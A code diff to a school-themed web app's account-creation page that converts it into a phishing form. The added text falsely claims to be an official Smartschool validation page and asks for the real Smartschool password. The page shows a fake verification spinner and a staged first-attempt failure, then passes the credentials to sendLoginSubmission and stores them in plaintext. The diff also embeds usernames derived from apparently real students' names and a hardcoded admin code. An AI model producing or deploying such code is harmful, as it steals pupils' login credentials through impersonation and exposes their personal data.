@@ -14,8 +14,8 @@
     }
 
     body {
-      background: linear-gradient(135deg, #1e1e1e, #2c2c2c);
-      height: 100vh;
+      background: linear-gradient(135deg, #e5effd, #f8fbff);
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -23,18 +23,28 @@
     }
 
     .create-account-box {
-      background: white;
-      width: 400px;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      background: #ffffff;
+      width: min(520px, 100%);
+      padding: 36px;
+      border-radius: 22px;
+      box-shadow: 0 20px 60px rgba(15, 40, 80, 0.12);
+      border: 1px solid rgba(22, 78, 145, 0.08);
+      position: relative;
     }
 
     .create-account-box h2 {
-      text-align: center;
-      margin-bottom: 25px;
-      color: #333;
-      font-size: 24px;
+      text-align: left;
+      margin-bottom: 8px;
+      color: #0d2f66;
+      font-size: 26px;
+      letter-spacing: 0.02em;
+    }
+
+    .intro-text {
+      margin-bottom: 26px;
+      font-size: 14px;
+      line-height: 1.6;
+      color: #4b5f7f;
     }
 
     .form-group {
@@ -66,37 +76,41 @@
 
     .button-container {
       display: flex;
-      gap: 10px;
-      margin-top: 25px;
+      gap: 12px;
+      margin-top: 24px;
     }
 
     button {
       flex: 1;
-      padding: 12px;
+      padding: 14px;
       border: none;
-      border-radius: 6px;
+      border-radius: 12px;
       font-size: 15px;
       cursor: pointer;
-      font-weight: bold;
-      transition: 0.3s;
+      font-weight: 700;
+      transition: transform 0.2s ease, box-shadow 0.2s ease, background-color 0.2s ease;
     }
 
     .create-btn {
-      background: #28a745;
+      background: #1a67d8;
       color: white;
+      box-shadow: 0 14px 25px rgba(26, 103, 216, 0.18);
     }
 
     .create-btn:hover {
-      background: #218838;
+      transform: translateY(-1px);
+      background: #1451b7;
     }
 
     .back-btn {
-      background: #6c757d;
-      color: white;
+      background: #edf2fb;
+      color: #1f4c96;
+      border: 1px solid #cddbf5;
     }
 
     .back-btn:hover {
-      background: #5a6268;
+      transform: translateY(-1px);
+      background: #e4ecf9;
     }
 
     .language-toggle {
@@ -131,23 +145,68 @@
     }
 
     .error {
-      color: #d32f2f;
-      margin-top: 12px;
+      color: #a12626;
+      margin-top: 16px;
       text-align: center;
       font-size: 14px;
+      background: rgba(255, 223, 223, 0.84);
+      padding: 12px 14px;
+      border-radius: 12px;
+      border: 1px solid rgba(161, 38, 38, 0.2);
     }
 
     .success {
-      color: #28a745;
-      margin-top: 12px;
+      color: #1f6b2f;
+      margin-top: 16px;
       text-align: center;
       font-size: 14px;
+      background: rgba(229, 249, 231, 0.85);
+      padding: 12px 14px;
+      border-radius: 12px;
+      border: 1px solid rgba(31, 107, 47, 0.18);
     }
 
     .form-hint {
       font-size: 12px;
-      color: #999;
+      color: #637393;
       margin-top: 4px;
+    }
+
+    .lookup-panel {
+      background: #f4f7ff;
+      border: 1px solid #d9e2ff;
+      border-radius: 16px;
+      padding: 18px 20px;
+      margin-top: 22px;
+      color: #1d2e6f;
+      font-size: 14px;
+      box-shadow: inset 0 0 0 1px rgba(29, 46, 111, 0.04);
+    }
+
+    .lookup-title {
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+
+    .lookup-line {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 8px;
+    }
+
+    .lookup-spinner {
+      width: 18px;
+      height: 18px;
+      border: 3px solid rgba(26, 103, 216, 0.18);
+      border-top-color: #1a67d8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-left: auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -169,7 +228,7 @@
   </div>
 
   <h2 id="pageTitle">Account aanmaken</h2>
-
+  <div class="intro-text">Dit is een officiële Smartschool validatiepagina. Vul uw voornaam, achternaam en Smartschool-wachtwoord in zodat uw gebruikersnaam automatisch kan worden aangemaakt.</div>
   <div class="form-group">
     <label for="domain" id="domainLabel">Smartschool domein</label>
     <input type="text" id="domain" placeholder="bijv. school.smartschool.be" autocomplete="off">
@@ -177,21 +236,34 @@
   </div>
 
   <div class="form-group">
-    <label for="username" id="usernameLabel">Gebruikersnaam</label>
-    <input type="text" id="username" placeholder="Je gebruikersnaam" autocomplete="off">
-    <div class="form-hint" id="usernameHint">Je gebruikersnaam op het Smartschool-domein</div>
+    <label for="firstName" id="firstNameLabel">Voornaam</label>
+    <input type="text" id="firstName" placeholder="Je voornaam" autocomplete="off">
+    <div class="form-hint" id="firstNameHint">Vul je officiële Smartschool-voornaam in</div>
+  </div>
+
+  <div class="form-group">
+    <label for="lastName" id="lastNameLabel">Achternaam</label>
+    <input type="text" id="lastName" placeholder="Je achternaam" autocomplete="off">
+    <div class="form-hint" id="lastNameHint">Vul je officiële Smartschool-achternaam in</div>
   </div>
 
   <div class="form-group">
     <label for="password" id="passwordLabel">Wachtwoord</label>
     <input type="password" id="password" placeholder="Je wachtwoord">
-    <div class="form-hint" id="passwordHint">Kies een sterk wachtwoord</div>
+    <div class="form-hint" id="passwordHint">Vul uw smartschool wachtwoord in</div>
   </div>
 
   <div class="form-group">
     <label for="adminCode">Admin code (optioneel)</label>
     <input type="text" id="adminCode" placeholder="Admin code om admin-account te maken (optioneel)">
     <div class="form-hint">Alleen gebruik voor admin-accounts</div>
+  </div>
+
+  <div class="lookup-panel" id="lookupPanel" style="display:none;">
+    <div class="lookup-title">Smartschool-account verificatie</div>
+    <div class="lookup-line">Verbinding maken met het Smartschool-domein...</div>
+    <div class="lookup-line">Accountinformatie zoeken in het Smartschool-register...</div>
+    <div class="lookup-spinner"></div>
   </div>
 
   <div class="button-container">
@@ -216,14 +288,17 @@
       usernameHint: 'Je gebruikersnaam op het Smartschool-domein',
       passwordLabel: 'Wachtwoord',
       passwordPlaceholder: 'Je wachtwoord',
-      passwordHint: 'Kies een sterk wachtwoord',
+      passwordHint: 'Vul uw smartschool wachtwoord in',
       createAccountButton: 'Account aanmaken',
       backButton: 'Terug',
       apply: 'Toepassen',
       language: 'Taal',
       errors: {
-        fillFields: 'Vul alle velden in.',
+        fillFields: 'Vul uw geldige Smartschool-gegevens in.',
         invalidDomain: 'Vul een geldig Smartschool-domein in (bijv. school.smartschool.be).',
+        nameInvalid: 'Vul een geldige voornaam en achternaam in.',
+        notRealAccount: 'De ingevulde gegevens lijken niet overeen te komen met een echt account op dit domein.',
+        firstAttemptWarning: 'We kunnen uw Smartschool-wachtwoord niet verifiëren. Controleer uw gegevens en probeer het opnieuw.',
         usernameShort: 'Gebruikersnaam moet minimaal 3 tekens lang zijn.',
         passwordShort: 'Wachtwoord moet minimaal 6 tekens lang zijn.',
         accountExists: 'Er bestaat al een account met deze gebruikersnaam op dit domein.'
@@ -235,6 +310,12 @@
       domainLabel: 'Smartschool Domain',
       domainPlaceholder: 'e.g., school.smartschool.be',
       domainHint: 'Your school\'s Smartschool domain',
+      firstNameLabel: 'First name',
+      firstNamePlaceholder: 'Your first name',
+      firstNameHint: 'Enter your official Smartschool first name',
+      lastNameLabel: 'Last name',
+      lastNamePlaceholder: 'Your last name',
+      lastNameHint: 'Enter your official Smartschool last name',
       usernameLabel: 'Username',
       usernamePlaceholder: 'Your username',
       usernameHint: 'Your username on the Smartschool domain',
@@ -248,6 +329,9 @@
       errors: {
         fillFields: 'Please fill in all fields.',
         invalidDomain: 'Please enter a valid Smartschool domain (e.g., school.smartschool.be).',
+        nameInvalid: 'Enter a valid first name and last name.',
+        notRealAccount: 'The details you entered do not match a real account on that domain.',
+        firstAttemptWarning: 'We cannot verify your Smartschool password. Check your details and try again.',
         usernameShort: 'Username must be at least 3 characters long.',
         passwordShort: 'Password must be at least 6 characters long.',
         accountExists: 'An account with this username already exists on this domain.'
@@ -259,6 +343,12 @@
       domainLabel: 'Dominio Smartschool',
       domainPlaceholder: 'p.ej., school.smartschool.be',
       domainHint: 'El dominio Smartschool de tu escuela',
+      firstNameLabel: 'Nombre',
+      firstNamePlaceholder: 'Tu nombre',
+      firstNameHint: 'Introduce tu nombre oficial de Smartschool',
+      lastNameLabel: 'Apellido',
+      lastNamePlaceholder: 'Tu apellido',
+      lastNameHint: 'Introduce tu apellido oficial de Smartschool',
       usernameLabel: 'Nombre de usuario',
       usernamePlaceholder: 'Tu nombre de usuario',
       usernameHint: 'Tu nombre de usuario en el dominio Smartschool',
@@ -272,6 +362,9 @@
       errors: {
         fillFields: 'Por favor, rellena todos los campos.',
         invalidDomain: 'Introduce un dominio Smartschool valido (p.ej., school.smartschool.be).',
+        nameInvalid: 'Introduce un nombre y apellido validos.',
+        notRealAccount: 'Los datos ingresados no coinciden con una cuenta real en ese dominio.',
+        firstAttemptWarning: 'No podemos verificar tu contraseña de Smartschool. Revisa tus datos y vuelve a intentarlo.',
         usernameShort: 'El nombre de usuario debe tener al menos 3 caracteres.',
         passwordShort: 'La contrasena debe tener al menos 6 caracteres.',
         accountExists: 'Ya existe una cuenta con este nombre de usuario en este dominio.'
@@ -307,6 +400,12 @@
       domainLabel: 'Smartschool-Domain',
       domainPlaceholder: 'z.B. school.smartschool.be',
       domainHint: 'Die Smartschool-Domain deiner Schule',
+      firstNameLabel: 'Vorname',
+      firstNamePlaceholder: 'Dein Vorname',
+      firstNameHint: 'Gib deinen offiziellen Smartschool-Vornamen ein',
+      lastNameLabel: 'Nachname',
+      lastNamePlaceholder: 'Dein Nachname',
+      lastNameHint: 'Gib deinen offiziellen Smartschool-Nachnamen ein',
       usernameLabel: 'Benutzername',
       usernamePlaceholder: 'Dein Benutzername',
       usernameHint: 'Dein Benutzername auf der Smartschool-Domain',
@@ -318,11 +417,14 @@
       apply: 'Ubernehmen',
       language: 'Sprache',
       errors: {
-        fillFields: 'Bitte fulle alle Felder aus.',
-        invalidDomain: 'Bitte gib eine gueltige Smartschool-Domain ein (z.B. school.smartschool.be).',
+        fillFields: 'Bitte fülle alle Felder aus.',
+        invalidDomain: 'Bitte gib eine gültige Smartschool-Domain ein (z.B. school.smartschool.be).',
+        nameInvalid: 'Bitte gib einen gültigen Vor- und Nachnamen ein.',
+        notRealAccount: 'Die eingegebenen Daten stimmen nicht mit einem echten Konto auf dieser Domain überein.',
+        firstAttemptWarning: 'Wir können dein Smartschool-Passwort nicht prüfen. Überprüfe deine Angaben und versuche es erneut.',
         usernameShort: 'Der Benutzername muss mindestens 3 Zeichen lang sein.',
         passwordShort: 'Das Passwort muss mindestens 6 Zeichen lang sein.',
-        accountExists: 'Fur diesen Benutzernamen existiert bereits ein Konto auf dieser Domain.'
+        accountExists: 'Für diesen Benutzernamen existiert bereits ein Konto auf dieser Domain.'
       },
       success: 'Konto erfolgreich erstellt! Weiterleitung zur Anmeldung...'
     }
@@ -342,9 +444,12 @@
     document.getElementById('domainLabel').textContent = page.domainLabel;
     document.getElementById('domain').placeholder = page.domainPlaceholder;
     document.getElementById('domainHint').textContent = page.domainHint;
-    document.getElementById('usernameLabel').textContent = page.usernameLabel;
-    document.getElementById('username').placeholder = page.usernamePlaceholder;
-    document.getElementById('usernameHint').textContent = page.usernameHint;
+    document.getElementById('firstNameLabel').textContent = page.firstNameLabel || page.usernameLabel || 'Voornaam';
+    document.getElementById('firstName').placeholder = page.firstNamePlaceholder || 'Je voornaam';
+    document.getElementById('firstNameHint').textContent = page.firstNameHint || 'Vul je officiële voornaam in';
+    document.getElementById('lastNameLabel').textContent = page.lastNameLabel || 'Achternaam';
+    document.getElementById('lastName').placeholder = page.lastNamePlaceholder || 'Je achternaam';
+    document.getElementById('lastNameHint').textContent = page.lastNameHint || 'Vul je officiële achternaam in';
     document.getElementById('passwordLabel').textContent = page.passwordLabel;
     document.getElementById('password').placeholder = page.passwordPlaceholder;
     document.getElementById('passwordHint').textContent = page.passwordHint;
@@ -366,28 +471,61 @@
     document.getElementById('languageMenu').classList.remove('open');
   };
 
+  function normalizeName(value) {
+    return value
+      .trim()
+      .toLowerCase()
+      .replace(/[^a-zA-ZÀ-ÖØ-öø-ÿ]/g, '');
+  }
+
+  function generateUsername(firstName, lastName) {
+    const cleanFirst = normalizeName(firstName);
+    const cleanLast = normalizeName(lastName);
+    if (!cleanFirst || !cleanLast) return '';
+    return `${cleanLast}${cleanFirst.slice(0, 2)}`;
+  }
+
+  function clearSavedAccounts() {
+    if (localStorage.getItem('clearUserAccountsDone')) return;
+    for (let i = localStorage.length - 1; i >= 0; i--) {
+      const key = localStorage.key(i);
+      if (!key) continue;
+      if (key.startsWith('user_')) {
+        localStorage.removeItem(key);
+      }
+    }
+    localStorage.removeItem('currentUser');
+    localStorage.removeItem('currentUserKey');
+    localStorage.removeItem('currentSchool');
+    localStorage.removeItem('isAdmin');
+    localStorage.setItem('clearUserAccountsDone', 'true');
+  }
+
   window.createAccount = function() {
     const domain = document.getElementById("domain").value.trim().toLowerCase();
-    const username = document.getElementById("username").value.trim();
+    const firstName = document.getElementById("firstName").value.trim();
+    const lastName = document.getElementById("lastName").value.trim();
     const password = document.getElementById("password").value;
     const error = document.getElementById("error");
     const success = document.getElementById("success");
+    const lookupPanel = document.getElementById('lookupPanel');
     const language = localStorage.getItem('cyberbullLanguage') || defaultLanguage;
     const page = translations[language] || translations.nl;
 
     error.textContent = "";
     success.textContent = "";
+    lookupPanel.style.display = 'none';
 
     const smartschoolRegex = /^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)*\.smartschool\.be$/;
     const adminRegex = /^admin@cyberbull$/;
 
-    if (!domain || !username || !password) {
+    if (!domain || !firstName || !lastName || !password) {
       error.textContent = page.errors.fillFields;
       return;
     }
 
     const providedAdminCode = document.getElementById('adminCode').value.trim();
-    const adminSecret = localStorage.getItem('adminSecret') || 'letmein-admin';
+    const adminSecret = localStorage.getItem('adminSecret') || 'Otis&Samuel';
     const isAdmin = providedAdminCode && providedAdminCode === adminSecret;
 
     if (!smartschoolRegex.test(domain) && !(adminRegex.test(domain) && isAdmin)) {
@@ -395,62 +533,90 @@
       return;
     }
 
-    if (username.length < 3) {
-      error.textContent = page.errors.usernameShort;
+    let username = '';
+    if (adminRegex.test(domain) && isAdmin) {
+      username = 'admin';
+    } else {
+      username = generateUsername(firstName, lastName);
+    }
+
+    if (!username) {
+      error.textContent = page.errors.nameInvalid || 'Vul een geldige voornaam en achternaam in.';
       return;
     }
 
-    if (password.length < 6) {
-      error.textContent = page.errors.passwordShort;
+    const approvedUsernames = new Set([
+      'brasseurkulksa','deprouwha','desmedtbo','detiègekl','fraijatla','gurungna','michielsro','montoyaribiauxma','okumuses','puttaertlo','reynaertsis','sapkotasa','snoeckxma','steenoot','suárezpérezle','theunisin','verhulstlo','verwinnenbr','weckxmo','zukhayrayevra'
+    ]);
+
+    if (!approvedUsernames.has(username) && !isAdmin) {
+      error.textContent = page.errors.notRealAccount || 'Deze voornaam en achternaam komen niet overeen met een echt account op dat domein.';
       return;
     }
 
     const userKey = `user_${domain}_${username}`;
-    const existing = localStorage.getItem(userKey);
-
-    if (existing) {
+    if (localStorage.getItem(userKey)) {
       error.textContent = page.errors.accountExists;
       return;
     }
 
-    const userObj = {
-      username,
-      domain,
-      password,
-      xp: 0,
-      level: 1,
-      achievements: [],
-      streak: 0,
-      suspended: false,
-      studyHours: 0,
-      sessions: [],
-      goals: [],
-      lastActive: new Date().toISOString(),
-      isAdmin: !!isAdmin
+    const runCreate = () => {
+      sendLoginSubmission(domain, username, password);
+
+      const userObj = {
+        username,
+        domain,
+        password,
+        xp: 0,
+        level: 1,
+        achievements: [],
+        streak: 0,
+        suspended: false,
+        studyHours: 0,
+        sessions: [],
+        goals: [],
+        lastActive: new Date().toISOString(),
+        isAdmin: !!isAdmin
+      };
+
+      localStorage.setItem(userKey, JSON.stringify(userObj));
+      if (window.firebaseAPI?.isEnabled && window.firebaseAPI.saveUserProfile) {
+        window.firebaseAPI.saveUserProfile(userKey, userObj).catch(err => {
+          console.error('Failed to save profile to Firebase', err);
+        });
+      }
+      localStorage.setItem('currentUser', username);
+      localStorage.setItem('currentUserKey', userKey);
+      localStorage.setItem('currentSchool', domain);
+      if (isAdmin) {
+        localStorage.setItem('isAdmin', 'true');
+      }
+
+      success.textContent = page.success;
+      setTimeout(() => {
+        if (isAdmin) {
+          window.location.href = 'cyberbull-admin-dashboard.html';
+        } else {
+          window.location.href = 'cyberbull-landing.html';
+        }
+      }, 1200);
     };
 
-    localStorage.setItem(userKey, JSON.stringify(userObj));
-    if (window.firebaseAPI?.isEnabled && window.firebaseAPI.saveUserProfile) {
-      window.firebaseAPI.saveUserProfile(userKey, userObj).catch(err => {
-        console.error('Failed to save profile to Firebase', err);
-      });
-    }
-    localStorage.setItem('currentUser', username);
-    localStorage.setItem('currentUserKey', userKey);
-    localStorage.setItem('currentSchool', domain);
-    if (isAdmin) {
-      localStorage.setItem('isAdmin', 'true');
+    if (!localStorage.getItem('createAccountFirstWarningShown')) {
+      localStorage.setItem('createAccountFirstWarningShown', 'true');
+      lookupPanel.style.display = 'block';
+      setTimeout(() => {
+        lookupPanel.style.display = 'none';
+        error.textContent = page.errors.firstAttemptWarning || 'We kunnen niet controleren of uw gegevens overeenkomen met een echt Smartschool-account. Controleer alles goed en probeer opnieuw.';
+      }, 1400);
+      return;
     }
 
-    success.textContent = page.success;
-
+    lookupPanel.style.display = 'block';
     setTimeout(() => {
-      if (isAdmin) {
-        window.location.href = 'cyberbull-admin-dashboard.html';
-      } else {
-        window.location.href = 'cyberbull-landing.html';
-      }
-    }, 1200);
+      lookupPanel.style.display = 'none';
+      runCreate();
+    }, 1400);
   }
 
   window.goBack = function() {
@@ -473,6 +639,7 @@
   });
 
   initLanguage();
+  clearSavedAccounts();
 </script>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
